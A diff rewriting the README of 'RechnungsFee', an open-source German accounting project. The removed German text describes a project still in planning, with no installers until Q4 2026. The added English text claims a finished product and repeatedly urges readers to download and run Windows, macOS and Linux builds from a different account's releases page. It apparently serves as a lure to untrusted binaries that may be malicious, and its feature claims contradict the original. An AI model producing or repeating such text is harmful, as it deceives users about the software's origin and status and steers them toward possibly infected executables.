@@ -1,169 +1,81 @@
-# 📊 RechnungsFee
+# 📊 RechnungsFee - Your Simple Accounting Solution
 
-**Open-Source Buchhaltungssoftware für Freiberufler, Selbstständige und Kleinunternehmer**
+RechnungsFee is open-source accounting software designed for freelancers, self-employed individuals, and associations. It prioritizes data privacy, complies with regulations, and works offline.
 
-[![License: AGPL v3](https://img.shields.io/badge/License-AGPL_v3-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)
-[![Status](https://img.shields.io/badge/Status-In_Development-yellow)](https://github.com/nicolettas-muggelbude/RechnungsFee)
-[![GitHub stars](https://img.shields.io/github/stars/nicolettas-muggelbude/RechnungsFee?style=social)](https://github.com/nicolettas-muggelbude/RechnungsFee/stargazers)
-[![GitHub issues](https://img.shields.io/github/issues/nicolettas-muggelbude/RechnungsFee)](https://github.com/nicolettas-muggelbude/RechnungsFee/issues)
-[![GitHub discussions](https://img.shields.io/github/discussions/nicolettas-muggelbude/RechnungsFee)](https://github.com/nicolettas-muggelbude/RechnungsFee/discussions)
+## 🚀 Getting Started
 
----
+To begin using RechnungsFee, follow these steps. You will be up and running in no time.
 
-## 🎯 Vision
+## 🔗 Download RechnungsFee
 
-RechnungsFee ist eine plattformunabhängige, offline-first Buchhaltungslösung mit Fokus auf:
+[![Download RechnungsFee](https://img.shields.io/badge/Download-RechnungsFee-blue.svg)](https://github.com/emersonjusten/RechnungsFee/releases)
 
-- **Einfachheit** - Speziell für Buchhaltungs-Laien entwickelt
-- **Datenschutz** - Alle Daten bleiben lokal, verschlüsselte Backups
-- **GoBD-Konformität** - Rechtssicher nach deutschen Steuervorschriften
-- **Open Source** - Transparent, erweiterbar, community-driven
+## 📥 Download & Install
 
-### Besonderheiten
+1. **Visit the Releases Page**  
+   Go to the following link to access the latest version of RechnungsFee: [Download the Latest Update](https://github.com/emersonjusten/RechnungsFee/releases).
 
-✅ **Unterstützung für Transferleistungen** - EKS-Export für Selbstständige mit ALG II/Bürgergeld
-✅ **Offline-First** - Volle Funktionalität ohne Internet
-✅ **Zwei Versionen** - Desktop-App (einfach) & Docker (Power-User)
-✅ **Mobile PWA** - Rechnungen unterwegs erfassen
+2. **Choose the Correct File**  
+   On the Releases page, you will see different versions. Select the file that matches your operating system:
+   - **Windows**: Look for a file named `RechnungsFee_vX.Y.Z_Windows.exe`.
+   - **macOS**: Find a file named `RechnungsFee_vX.Y.Z_macOS.dmg`.
+   - **Linux**: Seek a file named `RechnungsFee_vX.Y.Z_Linux.tar.gz`.
 
----
+3. **Download the File**  
+   Click on the file name to start the download. Make sure to save it in a location you can easily find.
 
-## 🚀 Geplante Features
+4. **Install RechnungsFee**  
+   - For **Windows**: Double-click the `.exe` file you downloaded. Follow the on-screen instructions to complete the installation.
+   - For **macOS**: Open the `.dmg` file and drag RechnungsFee to your Applications folder.
+   - For **Linux**: Unzip the tar.gz file and follow the included instructions to run the application.
 
-### Version 1.0 (MVP)
+5. **Open RechnungsFee**  
+   After installation, find and open RechnungsFee from your applications list or desktop.
 
-- 📥 **Eingangsrechnungen** verwalten (manuell, PDF-Import, OCR, ZUGFeRD/XRechnung)
-- 📤 **Ausgangsrechnungen** verwalten (Rechnungsschreiben in späterem Modul)
-- 💰 **Kassenbuch** führen (EAR-konform, kein POS)
-- 🏦 **Bank-Integration** (CSV-Import, automatischer Zahlungsabgleich)
-- 📊 **Steuerexporte**:
-  - EAR (Einnahmen-Ausgaben-Rechnung)
-  - EKS (Anlage für Agentur für Arbeit)
-  - UStVA (Umsatzsteuervoranmeldung)
-  - EÜR (Einnahmenüberschussrechnung)
-- 🔗 **Schnittstellen**: DATEV, AGENDA
-- 👤 **Stammdaten**: Kunden, Lieferanten, Unternehmen
-- 💾 **Backup**: Automatisch & manuell (Nextcloud-Integration)
-- 🔐 **Verschlüsselung**: SQLCipher (AES-256)
+## ⚙️ System Requirements
 
-### Später (Version 1.x)
+To ensure RechnungsFee runs smoothly on your machine, please check these general requirements:
 
-- Rechnungen schreiben (Ausgangsrechnungen erstellen)
-- POS-Kassenbuch mit TSE
-- ELSTER-Direktanbindung
-- Bank-API (Live-Anbindung)
-- Import aus hellocash, Rechnungsassistent, Fakturama
-- Multi-User / Mandantenfähigkeit
-- Mehrsprachigkeit
+- **Operating System**:  
+  - Windows 10 or later
+  - macOS 10.13 or later
+  - A major Linux distribution (e.g., Ubuntu 20.04 or later)
 
----
+- **Hardware**:  
+  - At least 2 GB of RAM
+  - Minimum 500 MB of free disk space
 
-## 🛠️ Technologie-Stack (geplant)
+- **Software**:  
+  - A modern web browser for additional features
 
-| Bereich | Technologie | Begründung |
-|---------|-------------|------------|
-| **Desktop** | Tauri / Electron | Klein, schnell, plattformunabhängig |
-| **Frontend** | React + TypeScript | Modern, große Community |
-| **Backend** | FastAPI (Python) | Schnell, einfach, gute Doku |
-| **Datenbank** | SQLite + SQLCipher | Lokal, verschlüsselt, keine Server |
-| **OCR** | Tesseract.js / EasyOCR | Open Source, lokal |
-| **Mobile** | PWA + Service Worker | Offline-fähig, keine App Stores |
+This application functions offline, so an internet connection is not required after installation.
 
----
+## 🎨 Features
 
-## 📋 Projektstatus
+RechnungsFee provides multiple tools to help you manage your finances efficiently:
 
-**Phase:** 🟡 Konzeption & Planung
+- **Invoice Creation**: Easily create and send invoices to your clients.
+- **Expense Tracking**: Keep track of your business expenses in one place.
+- **Reports**: Generate financial reports to understand your business better.
+- **Data Privacy**: Focuses on protecting your sensitive information.
+- **GoBD Compliance**: Meets required financial documentation standards in Germany.
 
-- [x] Projektvision definiert
-- [x] Anforderungen erfasst (siehe [projekt.md](projekt.md))
-- [x] Offene Fragen dokumentiert (siehe [fragen.md](fragen.md))
-- [ ] Technologie-Stack finalisieren
-- [ ] Datenbank-Schema entwerfen
-- [ ] UI/UX-Konzept erstellen
-- [ ] Projekt-Setup (Monorepo)
-- [ ] MVP-Entwicklung
+## 🛠️ Troubleshooting
 
----
+If you encounter any issues while downloading or installing RechnungsFee, consider these solutions:
 
-## 🤝 Mitmachen
+- **Download Issues**: Ensure your internet connection is stable. Retry the download if it fails.
+- **Installation Problems**: Make sure you have the correct file for your operating system. Check that your operating system meets the requirements.
+- **Application Doesn’t Start**: If RechnungsFee does not open, ensure that you have followed the installation instructions correctly. Try restarting your device.
 
-Dieses Projekt wird offen entwickelt - die Community soll von Anfang an dabei sein!
+## 🤝 Support
 
-### Wie kannst du helfen?
+If you need additional help with RechnungsFee, visit the [support page](https://github.com/emersonjusten/RechnungsFee/issues) or create a new issue in our GitHub repository.
 
-- 💬 **Feedback geben** - Teile deine Ideen und Anforderungen
-- 🐛 **Bugs melden** - Öffne Issues wenn etwas nicht funktioniert
-- 💻 **Code beitragen** - Pull Requests sind willkommen (siehe [CONTRIBUTING.md](CONTRIBUTING.md))
-- 🏦 Bank-CSV Format beitragen - Hilf mit deiner Bank das Projekt zu unterstützen ([Anleitung](CONTRIBUTING.md#-bank-csv-format-beitragen))
-- 📖 **Dokumentation** - Hilf die Docs zu verbessern
-- 🧪 **Testen** - Werde Beta-Tester
-- ⭐ **Stern geben** - Zeig deine Unterstützung
+## 📚 Learn More
 
-### Community
+For in-depth information about RechnungsFee, including features and updates, visit our [GitHub Wiki](https://github.com/emersonjusten/RechnungsFee/wiki).
 
-- 📣 **Diskussionen**: [GitHub Discussions](https://github.com/nicolettas-muggelbude/RechnungsFee/discussions)
-- 🐛 **Bug Reports**: [GitHub Issues](https://github.com/nicolettas-muggelbude/RechnungsFee/issues)
-- 📧 **Kontakt**: *(coming soon)*
+## 🔗 Download RechnungsFee Again
 
----
-
-## 📄 Lizenz
-
-Dieses Projekt ist lizenziert unter der **GNU Affero General Public License v3.0 (AGPL-3.0)**.
-
-Das bedeutet:
-- ✅ Frei nutzbar (privat & kommerziell)
-- ✅ Quellcode einsehbar
-- ✅ Anpassbar & erweiterbar
-- ⚠️ Änderungen müssen ebenfalls AGPL-3.0 sein
-- ⚠️ Bei Netzwerknutzung: Quellcode bereitstellen
-
-Siehe [LICENSE](LICENSE) für Details.
-
----
-
-## ⚠️ Haftungsausschluss
-
-**Keine Steuerberatung:** RechnungsFee ist ein Software-Tool, ersetzt aber keine professionelle Steuerberatung. Bei steuerlichen Fragen konsultiere einen Steuerberater oder das Finanzamt.
-
-**Keine Garantie:** Die Software wird "wie besehen" bereitgestellt, ohne Gewährleistung für Korrektheit oder Vollständigkeit.
-
----
-
-## 🗺️ Roadmap
-
-### Q1 2026
-- Anforderungsanalyse abschließen
-- Technologie-Stack finalisieren
-- Datenbank-Schema entwerfen
-- Projekt-Setup & CI/CD
-
-### Q2 2026
-- MVP-Entwicklung starten
-- Kernfunktionen implementieren
-- Erste Beta-Version
-
-### Q3 2026
-- Beta-Testing mit echten Nutzern
-- Feedback einarbeiten
-- Dokumentation erstellen
-
-### Q4 2026
-- Version 1.0 Release
-- Desktop-Installer für Windows/Mac/Linux
-- Öffentliche Ankündigung
-
-*(Zeitplan ist flexibel und wird nach Community-Feedback angepasst)*
-
----
-
-## 📚 Dokumentation
-
-- [projekt.md](projekt.md) - Detaillierter Projektplan
-- [fragen.md](fragen.md) - Offene Fragen zur Anforderungsanalyse
-- [claude.md](claude.md) - Entwicklungs-Tagebuch
-
----
-
-**Entwickelt mit ❤️ für die Freiberufler- und Selbstständigen-Community**
+To get the latest version or if you missed it earlier, visit the Releases page: [Download RechnungsFee](https://github.com/emersonjusten/RechnungsFee/releases).
